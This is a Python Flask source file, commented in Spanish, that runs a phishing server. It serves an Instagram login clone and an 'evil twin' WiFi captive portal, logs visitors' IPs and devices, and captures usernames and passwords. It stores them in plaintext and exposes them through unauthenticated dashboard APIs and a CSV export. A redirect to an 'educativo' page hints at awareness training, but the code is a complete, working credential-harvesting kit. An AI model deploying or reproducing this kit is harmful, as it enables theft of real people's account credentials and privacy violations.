from flask import Flask, request, redirect, render_template_string, jsonify, send_file
import time
import os
import sqlite3
import json
from datetime import datetime
import csv
import io

app = Flask(__name__, static_folder='PruebasHTML', static_url_path='/PruebasHTML')

# Inicializar base de datos
def init_db():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    # Tabla de visitas
    c.execute('''CREATE TABLE IF NOT EXISTS visits
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  scenario TEXT)''')
    
    # Tabla de credenciales capturadas
    c.execute('''CREATE TABLE IF NOT EXISTS captures
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  ip_address TEXT,
                  user_agent TEXT,
                  scenario TEXT,
                  username TEXT,
                  password TEXT,
                  extra_data TEXT)''')
    
    conn.commit()
    conn.close()

init_db()

def log_info(tipo, mensaje):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[{timestamp}] [{tipo}] {mensaje}")

def save_visit(ip, user_agent, scenario):
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO visits (timestamp, ip_address, user_agent, scenario) VALUES (?, ?, ?, ?)",
              (timestamp, ip, user_agent, scenario))
    conn.commit()
    conn.close()

def save_capture(ip, user_agent, scenario, username, password, extra_data=None):
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO captures (timestamp, ip_address, user_agent, scenario, username, password, extra_data) VALUES (?, ?, ?, ?, ?, ?, ?)",
              (timestamp, ip, user_agent, scenario, username, password, extra_data))
    conn.commit()
    conn.close()

@app.route('/')
def home():
    # 1. CAPTURA DE HUELLA DIGITAL (IP + User Agent)
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log_info("VISITA DETECTADA", f"IP: {ip_address} | Dispositivo: {user_agent}")
    save_visit(ip_address, user_agent, "Instagram")

    try:
        with open('PruebasHTML/indexinsta.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: No se encuentra el archivo principal."

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    # 2. CAPTURA DE CREDENCIALES
    print("="*60)
    print(f" [!!!] CREDENCIALES CAPTURADAS (IP: {ip_address})")
    print(f" > Usuario:    {username}")
    print(f" > Contraseña: {password}")
    print("="*60)
    
    save_capture(ip_address, user_agent, "Instagram", username, password)
    
    # Redirigir a la página educativa
    return redirect("/educativo?scenario=social")

@app.route('/educativo')
def educativo():
    # Página educativa dinámica
    scenario = request.args.get('scenario', 'general') # default to general
    try:
        with open('PruebasHTML/educativo.html', 'r', encoding='utf-8') as f:
            # Usamos render_template_string para inyectar variables en el HTML leído
            return render_template_string(f.read(), scenario=scenario)
    except FileNotFoundError:
        return "Error: Falta educativo.html"

# --- RUTAS NUEVAS: PORTAL CAUTIVO WIFI (EVIL TWIN) ---

@app.route('/wifi')
def wifi_portal():
    # Renderizamos la página del Portal WiFi
    try:
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        log_info("VISITA WIFI DETECTADA", f"IP: {ip_address} | Dispositivo: {user_agent}")
        save_visit(ip_address, user_agent, "WiFi Portal")
        
        with open('PruebasHTML/wifi_portal.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta wifi_portal.html"

@app.route('/wifi-login', methods=['POST'])
def wifi_login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    print("="*60)
    print(f" [!!!] CREDENCIALES WIFI CAPTURADAS (IP: {ip_address})")
    print(f" > Email/User: {email}")
    print(f" > Password:   {password}")
    print("="*60)
    
    save_capture(ip_address, user_agent, "WiFi Portal", email, password)
    
    # Redirigir a la página educativa
    return redirect("/educativo?scenario=wifi")

# --- DASHBOARD ADMINISTRATIVO ---

@app.route('/admin')
def admin_dashboard():
    try:
        with open('PruebasHTML/dashboard.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta dashboard.html"

@app.route('/email-demo')
def email_demo():
    """Muestra cómo se vería un correo de phishing real"""
    try:
        with open('PruebasHTML/email_phishing.html', 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        return "Error: Falta email_phishing.html"

@app.route('/api/stats')
def get_stats():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    # Total de visitas
    c.execute("SELECT COUNT(*) FROM visits")
    total_visits = c.fetchone()[0]
    
    # Total de capturas
    c.execute("SELECT COUNT(*) FROM captures")
    total_captures = c.fetchone()[0]
    
    # Tasa de conversión
    conversion_rate = (total_captures / total_visits * 100) if total_visits > 0 else 0
    
    # Víctimas por escenario
    c.execute("SELECT scenario, COUNT(*) FROM captures GROUP BY scenario")
    by_scenario = dict(c.fetchall())
    
    # IPs únicas
    c.execute("SELECT COUNT(DISTINCT ip_address) FROM captures")
    unique_ips = c.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'total_visits': total_visits,
        'total_captures': total_captures,
        'conversion_rate': round(conversion_rate, 2),
        'by_scenario': by_scenario,
        'unique_ips': unique_ips
    })

@app.route('/api/captures')
def get_captures():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC LIMIT 100")
    captures = c.fetchall()
    
    conn.close()
    
    captures_list = []
    for capture in captures:
        captures_list.append({
            'id': capture[0],
            'timestamp': capture[1],
            'ip': capture[2],
            'user_agent': capture[3],
            'scenario': capture[4],
            'username': capture[5],
            'password': capture[6]
        })
    
    return jsonify(captures_list)

@app.route('/api/timeline')
def get_timeline():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("""
        SELECT strftime('%Y-%m-%d %H:00:00', timestamp) as hour, COUNT(*) 
        FROM captures 
        GROUP BY hour 
        ORDER BY hour DESC 
        LIMIT 24
    """)
    timeline = c.fetchall()
    
    conn.close()
    
    return jsonify([{'time': t[0], 'count': t[1]} for t in reversed(timeline)])

@app.route('/api/export/csv')
def export_csv():
    conn = sqlite3.connect('phishing_data.db')
    c = conn.cursor()
    
    c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    captures = c.fetchall()
    
    conn.close()
    
    # Crear CSV en memoria
    output = io.StringIO()
    writer = csv.writer(output)
    
    # Encabezados
    writer.writerow(['ID', 'Timestamp', 'IP Address', 'User Agent', 'Scenario', 'Username', 'Password', 'Extra Data'])
    
    # Datos
    for capture in captures:
        writer.writerow(capture)
    
    # Convertir a bytes
    output.seek(0)
    return send_file(
        io.BytesIO(output.getvalue().encode('utf-8')),
        mimetype='text/csv',
        as_attachment=True,
        download_name=f'phishing_captures_{datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
    )

if __name__ == '__main__':
    print("""
    =======================================================
     SERVIDOR DE PHISHING AVANZADO (MULTI-SCENARIO)
     
     [ESCENARIO 1] Instagram Clone
     > URL: http://localhost:5000/
     
     [ESCENARIO 2] Evil Twin WiFi Portal
     > URL: http://localhost:5000/wifi
     
     - Registro de IPs y Dispositivos: ACTIVADO
     - Captura de Credenciales: ACTIVADO
    =======================================================
    """)
    # Usamos 0.0.0.0 para que sea visible en la red local si se desea
    app.run(host='0.0.0.0', port=5000, debug=False)
